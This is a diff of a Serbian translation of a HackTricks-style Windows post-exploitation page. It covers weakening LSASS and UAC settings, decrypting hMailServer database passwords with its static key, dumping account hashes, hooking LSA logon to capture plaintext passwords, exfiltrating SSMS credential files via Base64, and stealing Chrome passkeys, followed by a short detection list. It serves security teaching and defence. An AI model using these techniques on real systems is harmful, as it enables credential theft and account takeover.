+* Podešavanje `DisableRestrictedAdmin=1` primorava potpunu ponovnu upotrebu kredencijala/ticketa tokom RDP-a, što omogućava pivotiranje u stilu pass-the-hash.
+* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, tako da lokalni administratori dobijaju neograničene tokene preko mreže.
+* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru prijavljivanje dok je DC aktivan, pružajući napadačima još jedan ugrađeni nalog sa visokim privilegijama.
+* `RunAsPPL=0` uklanja LSASS PPL zaštite, čineći pristup memoriji trivijalnim za dumpere kao što je LalsDumper.
 
-## hMailServer kredencijali baze podataka (post-compromise)
+## hMailServer database credentials (post-compromise)
 
-hMailServer čuva svoju DB lozinku u `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` pod `[Database] Password=`. Vrednost je Blowfish-encrypted sa statičkim ključem `THIS_KEY_IS_NOT_SECRET` i 4-byte word endianness swaps. Koristite hex string iz INI sa ovim Python snippetom:
+hMailServer čuva lozinku svoje baze podataka u `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, pod `[Database] Password=`. Vrednost je Blowfish-enkriptovana pomoću statičkog ključa `THIS_KEY_IS_NOT_SECRET`, uz zamene endianness-a 4-bajtnih reči. Koristite hex string iz INI datoteke sa ovim Python snippet-om:
 ```python
 from Crypto.Cipher import Blowfish
 import binascii
@@ -347,7 +347,7 @@ key = b"THIS_KEY_IS_NOT_SECRET"
 plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
 print(plain.decode())
 ```
-Kopirajte SQL CE database (koristeći clear-text password) da izbegnete file locks, učitajte 32-bit provider i nadogradite ako je potrebno pre nego što upitujete hashes:
+Sa lozinkom u čistom tekstu, kopirajte SQL CE bazu podataka da biste izbegli zaključavanje datoteke, učitajte 32-bitni provider i po potrebi izvršite upgrade pre upita za hash vrednosti:
 ```powershell
 Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
 Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
@@ -356,31 +356,88 @@ $engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
 $conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
 $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
 ```
-Kolona `accountpassword` koristi hMailServer hash format (hashcat mode `1421`). Razbijanje ovih vrednosti može obezbediti ponovo upotrebljive kredencijale za WinRM/SSH pivote.
+Kolona `accountpassword` koristi hMailServer hash format (hashcat mode `1421`). Cracking ovih vrednosti može obezbediti ponovo upotrebljive kredencijale za WinRM/SSH pivote.
+## Presretanje LSA Logon Callback-a (LsaApLogonUserEx2)
 
-## LSA Logon Callback Interception (LsaApLogonUserEx2)
-
-Neki alati presreću **plaintext lozinke za prijavu** tako što presretnu LSA logon callback `LsaApLogonUserEx2`. Ideja je da se hook-uje ili wrap-uje authentication package callback tako da se kredencijali uhvate **tokom prijave** (pre heširanja), a zatim upišu na disk ili vrate operatoru. Ovo se obično implementira kao pomoćni modul koji se injektuje u LSA ili registruje kod LSA, i zatim beleži svaki uspešan interaktivni/mrežni događaj prijave sa korisničkim imenom, domenom i lozinkom.
+Neki alati hvataju **plaintext lozinke za prijavljivanje** presretanjem LSA logon callback-a `LsaApLogonUserEx2`. Ideja je da se authentication package callback hook-uje ili wrap-uje tako da se kredencijali hvataju **tokom prijavljivanja** (pre hashovanja), a zatim zapisuju na disk ili vraćaju operatoru. Ovo se obično implementira kao helper koji se inject-uje u LSA ili se registruje sa njim, a zatim beleži svaki uspešan interactive/network logon događaj sa korisničkim imenom, domenom i lozinkom.
 
 Operativne napomene:
-- Zahteva local admin/SYSTEM da učita pomoćni modul u authentication path.
-- Uhvaćeni kredencijali se pojavljuju samo kada dođe do prijave (interaktivna, RDP, servisna ili mrežna prijava, u zavisnosti od hook-a).
+- Zahteva local admin/SYSTEM privilegije za učitavanje helper-a u authentication path.
+- Uhvaćeni kredencijali se pojavljuju samo kada dođe do prijavljivanja (interactive, RDP, service ili network logon, u zavisnosti od hook-a).
 
-## SSMS Saved Connection Credentials (sqlstudio.bin)
+## Sačuvani SSMS kredencijali za povezivanje (sqlstudio.bin)
 
-SQL Server Management Studio (SSMS) čuva sačuvane informacije o konekcijama u per-user `sqlstudio.bin` fajlu. Specijalizovani dumperi mogu parsirati fajl i oporaviti sačuvane SQL kredencijale. U shell-ovima koji vraćaju samo izlaz komandi, fajl se često eksfiltrira enkodiranjem u Base64 i ispisivanjem na stdout.
+SQL Server Management Studio (SSMS) čuva informacije o sačuvanim konekcijama u fajlu `sqlstudio.bin` za konkretnog korisnika. Namenski dumpers mogu parsirati fajl i oporaviti sačuvane SQL kredencijale. U shell-ovima koji vraćaju samo izlaz komandi, fajl se često eksfiltrira tako što se kodira kao Base64 i ispisuje na stdout.
 ```cmd
 certutil -encode sqlstudio.bin sqlstudio.b64
 type sqlstudio.b64
 ```
-Na strani operatera, ponovo izgradite datoteku i pokrenite dumper lokalno da biste povratili podatke za prijavu:
+Na strani operatora, ponovo izgradite fajl i pokrenite dumper lokalno da biste povratili akreditive:
 ```bash
 base64 -d sqlstudio.b64 > sqlstudio.bin
 ```
+## Krađa Passkeys / WebAuthn kredencijala iz Chrome-a na Windows-u
+
+Ako se izvršavanje koda dobije kao **korisnik žrtva** na Windows hostu koji koristi **Chrome + Google Password Manager synced passkeys**, Passkeys postaju zanimljiva meta za post-exploitation, čak i **bez admin/SYSTEM** privilegija.
+
+### Zanimljivi lokalni artefakti
+```text
+%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
+%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
+```
+- **`Sync Data\LevelDB`** skladišti protobuf-enkodirane zapise **`WebauthnCredentialSpecifics`**. Proces istog korisnika može da enumeriše **RP ID**, **username**, **credential ID** i materijal šifrovanog privatnog ključa za sinhronizovane passkeys.
+- **`passkey_enclave_state`** skladišti stanje lokalne registracije uređaja, kao što su **`wrapped_identity_private_key`** i wrapped secret koji se koristi za oporavak sinhronizovanih credentiala.
+
+Brza trijaža:
+```powershell
+Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
+Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
+Select-Object FullName, Length, LastWriteTime
+```
+### TPM-bound key blobs can still be abused as a local signing oracle
+
+Ako browser izveze identitetski ključ podržan TPM-om kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malware **ne mora** da izvuče sirovi privatni ključ. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke koje kontroliše napadač:
+```c
+NCryptOpenStorageProvider(...)
+NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
+NCryptSignHash(...)
+```
+To znači da **hardversko vezivanje sprečava izvoz van uređaja, ali ne i korišćenje istog korisnika na kompromitovanom endpoint-u**.
+
+### Praktični načini zloupotrebe
+
+1. **Pass-ta-key / relay identiteta uređaja**
+- Izlistati `WebauthnCredentialSpecifics` iz Chrome-ovog LevelDB-a.
+- Pokrenuti passkey login i dobiti svež WebAuthn challenge.
+- Upotrebiti ukradeni `wrapped_identity_private_key` blob na TPM-u žrtve za potpisivanje binding-a cloud-authenticator zahteva.
+- Proslediti dobijenu assertion relying party-ju.
+- Ovo je naročito korisno kada RP prihvata `userVerification=preferred` ili ne odbacuje assertion-e sa **`UV=0`**.
+
+2. **Preuzimanje pending UV-key-a**
+- Prisiliti ponovno onboarding brisanjem `passkey_enclave_state` ili slanjem validne potpisane `device/forget` operacije.
+- Ako onboarding ostavi uređaj u stanju **`uv_key_pending`**, registrovati UV javni ključ kojim upravlja napadač.
+- Ako provider ne proverava attestation / poreklo iz secure hardware-a za novi UV ključ, kasniji potpisi napadačevog ključa tretiraju se kao **`UV=1`**.
+
+3. **Krađa master-secret-a / SDS-a tokom recovery-ja**
+- Prisiliti recovery ili rejoin kako bi Chrome preuzeo master secret za synced-passkey.
+- Pratiti ponovno kreiranje/izmene `passkey_enclave_state`, a zatim izvršiti dump Chrome memorije dok se plaintext **security domain secret (SDS)** nalazi u memoriji.
+- Upotrebiti pronađeni SDS za dešifrovanje šifrovanih polja u svakom `WebauthnCredentialSpecifics` zapisu i oporavak prenosivih WebAuthn privatnih ključeva.
+
+### DFIR / ideje za detekciju
+
+- Nadzirati **brisanje/ponovno kreiranje** fajla `passkey_enclave_state`.
+- Upozoriti na neuobičajen pristup Chrome-ovom **`Sync Data\LevelDB`** direktorijumu iz procesa koji nisu browser.
+- Upozoriti na **dump-ove Chrome memorije** ili sumnjiv pristup memoriji između procesa.
+- Istražiti ponovljene zahteve za **Google Password Manager recovery PIN** ili neočekivani re-onboarding.
+- Imajte na umu da WebAuthn **`signCount`** često nije koristan za synced passkeys jer može ostati konstantan, pa je klasična detekcija klonova nepouzdana.
+
 ## Reference
 
-- [Unit 42 – Istraga o godinama neotkrivenih operacija koje su ciljale sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
-- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
-- [Check Point Research – Unutar Ink Dragon-a: Otkrivanje relejne mreže i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [Unit 42 – Istraga višegodišnjih neotkrivenih operacija usmerenih na sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
+- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing preko SMTP-a → dešifrovanje hMailServer credential-a → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
+- [Check Point Research – Inside Ink Dragon: Otkrivanje relay mreže i unutrašnjeg rada prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [Unit 42 – Pass the Passkey: Nova attack surface u passwordless autentikaciji](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
+- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
+- [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
 
 {{#include ../../banners/hacktricks-training.md}}
